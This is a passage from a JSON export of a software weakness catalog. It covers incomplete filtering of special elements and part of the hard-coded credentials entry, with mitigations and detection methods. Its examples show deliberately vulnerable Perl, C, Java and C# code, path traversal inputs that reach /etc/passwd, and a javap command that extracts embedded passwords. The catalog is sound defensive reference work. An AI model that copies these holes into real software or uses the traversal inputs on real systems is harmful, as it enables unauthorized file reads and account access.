        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "791",
      "Name": "Incomplete Filtering of Special Elements",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "790",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-2",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\t$Username =~ s/\\.\\.\\///;\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" stripped, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "792",
      "Name": "Incomplete Filtering of One or More Instances of Special Elements",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but does not completely filter one or more instances of special elements before sending it to a downstream component.",
      "ExtendedDescription": "\n\nIncomplete filtering of this nature involves either:\n\n\n  - only filtering a single instance of a special element when more exist, or\n\n  - not filtering all instances or all elements where multiple special elements exist.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "791",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-2",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\t$Username =~ s/\\.\\.\\///;\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" stripped, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "793",
      "Name": "Only Filtering One Instance of a Special Element",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but only filters a single instance of a special element before sending it to a downstream component.",
      "ExtendedDescription": "Incomplete filtering of this nature may be location-dependent, as in only the first or last element is filtered.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "792",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-2",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\t$Username =~ s/\\.\\.\\///;\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" stripped, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "794",
      "Name": "Incomplete Filtering of Multiple Instances of Special Elements",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but does not filter all instances of a special element before sending it to a downstream component.",
      "ExtendedDescription": "\n\nIncomplete filtering of this nature may be applied to:\n\n\n  - sequential elements (special elements that appear next to each other) or\n\n  - non-sequential elements (special elements that appear multiple times in different locations).\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "792",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-2",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\t$Username =~ s/\\.\\.\\///;\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" stripped, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "795",
      "Name": "Only Filtering Special Elements at a Specified Location",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but only accounts for special elements at a specified location, thereby missing remaining special elements that may exist before sending it to a downstream component.",
      "ExtendedDescription": "\n\nA filter might only account for instances of special elements when they occur:\n\n\n  - relative to a marker (e.g. \"at the beginning/end of string; the second argument\"), or\n\n  - at an absolute position (e.g. \"byte number 10\").\n\nThis may leave special elements in the data that did not match the filter position, but still may be dangerous.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "791",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-3",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a regular expression to filter a \"../\" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\t$Username =~ s/^\\.\\.\\///;\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the regular expression is only looking for an instance of \"../\" at the beginning of the string, it only removes the first \"../\" element. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" stripped, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22)."
            }
          ]
        },
        {
          "ID": "DX-4",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a substring function to filter a 3-character \"../\" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\tif (substr($Username, 0, 3) eq '../') {\n\t\t$Username = substr($Username, 3);\n\t}\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the if function is only looking for a substring of \"../\" between the 0 and 2 position, it only removes that specific \"../\" element. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" filtered, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "796",
      "Name": "Only Filtering Special Elements Relative to a Marker",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but only accounts for special elements positioned relative to a marker (e.g. \"at the beginning/end of a string; the second argument\"), thereby missing remaining special elements that may exist before sending it to a downstream component.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "795",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-3",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a regular expression to filter a \"../\" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\t$Username =~ s/^\\.\\.\\///;\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the regular expression is only looking for an instance of \"../\" at the beginning of the string, it only removes the first \"../\" element. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" stripped, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "797",
      "Name": "Only Filtering Special Elements at an Absolute Position",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but only accounts for special elements at an absolute position (e.g. \"byte number 10\"), thereby missing remaining special elements that may exist before sending it to a downstream component.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "795",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-4",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a substring function to filter a 3-character \"../\" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\tif (substr($Username, 0, 3) eq '../') {\n\t\t$Username = substr($Username, 3);\n\t}\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the if function is only looking for a substring of \"../\" between the 0 and 2 position, it only removes that specific \"../\" element. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" filtered, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "798",
      "Name": "Use of Hard-coded Credentials",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Diagram": "/data/images/CWE-798-Diagram.png",
      "Description": "The product contains hard-coded credentials, such as a password or cryptographic key.",
      "ExtendedDescription": "\n\nThere are two main variations:\n\n\n  - Inbound: the product contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials. In this variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. It can also be difficult for the administrator to detect.\n\n  - Outbound: the product connects to another system or component, and it contains hard-coded credentials for connecting to that component. This variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password that can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product.\n\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1391",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "287",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "344",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "671",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "257",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "\n\nIf hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question.\n\n\nAny user of the product that hard-codes passwords may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.\n"
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability",
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Read Application Data",
            "Gain Privileges or Assume Identity",
            "Execute Unauthorized Code or Commands",
            "Other"
          ],
          "Note": "\n\nThis weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.\n\n\nIf the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place.\n"
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Black Box",
          "Description": "Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.",
          "Effectiveness": "Moderate"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods."
        },
        {
          "Method": "Manual Static Analysis",
          "Description": "This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the product, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.",
          "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
        },
        {
          "Method": "Manual Dynamic Analysis",
          "Description": "\n\nFor hard-coded credentials in incoming authentication: use monitoring tools that examine the product's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the product was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.\n\n\nAttach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.\n"
        },
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "High"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tNetwork Sniffer\n\t\tForced Path Execution",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tConfiguration Checker",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nFor outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].\n\n\nIn Windows environments, the Encrypted File System (EFS) may provide some protection.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a \"first login\" mode that requires the user to enter a unique strong password or key."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "If the product must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nFor inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.\n\n\nUse randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nFor front-end to back-end connections: Three solutions are possible, although none are complete.\n\n\n  - The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.\n\n  - Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.\n\n  - Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.\n\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-13",
          "Entries": [
            {
              "IntroText": "The following code uses a hard-coded password to connect to a database:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t...\n\tDriverManager.getConnection(url, \"scott\", \"tiger\");\n\t...\n```"
            },
            {
              "BodyText": "This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user \"scott\" with a password of \"tiger\" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\tjavap -c ConnMngr.class\n\t\t22: ldc #36; //String jdbc:mysql://ixne.com/rxsql\n\t\t24: ldc #38; //String scott\n\t\t26: ldc #17; //String tiger\n```"
            }
          ]
        },
        {
          "ID": "DX-14",
          "Entries": [
            {
              "IntroText": "The following code is an example of an internal hard-coded password in the back-end:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint VerifyAdmin(char *password) {\n\t\t\tif (strcmp(password, \"Mew!\")) {\n\t\t\t\t\t printf(\"Incorrect Password!\\n\");\n\t\t\t\t\treturn(0)\n\t\t\t}\n\t\t\tprintf(\"Entering Diagnostic Mode...\\n\");\n\t\t\treturn(1);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tint VerifyAdmin(String password) {\n\t\tif (!password.equals(\"Mew!\")) {\n\t\t\treturn(0)\n\t\t}\n\t\t//Diagnostic Mode\n\t\treturn(1);\n\t}\n```"
            },
            {
              "BodyText": "Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this \"functionality.\""
            }
          ]
        },
        {
          "ID": "DX-92",
          "Entries": [
            {
              "IntroText": "The following code examples attempt to verify a password using a hard-coded cryptographic key."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint VerifyAdmin(char *password) {\n\t\t\tif (strcmp(password,\"68af404b513073584c4b6f22b6c63e6b\")) {\n\t\t\t\t\tprintf(\"Incorrect Password!\\n\");\n\t\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tprintf(\"Entering Diagnostic Mode...\\n\");\n\t\t\treturn(1);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic boolean VerifyAdmin(String password) {\n\t\tif (password.equals(\"68af404b513073584c4b6f22b6c63e6b\")) {\n\t\t\tSystem.out.println(\"Entering Diagnostic Mode...\");\n\t\t\treturn true;\n\t\t}\n\t\tSystem.out.println(\"Incorrect Password!\");\n\t\treturn false;\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tint VerifyAdmin(String password) {\n\t\tif (password.Equals(\"68af404b513073584c4b6f22b6c63e6b\")) {\n\t\t\tConsole.WriteLine(\"Entering Diagnostic Mode...\");\n\t\t\treturn(1);\n\t\t}\n\t\tConsole.WriteLine(\"Incorrect Password!\");\n\t\treturn(0);\n\t}\n```"
            },
            {
              "BodyText": "The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system."
            }
          ]
        },
        {
          "ID": "DX-43",
          "Entries": [
            {
              "IntroText": "The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext."
            },
            {
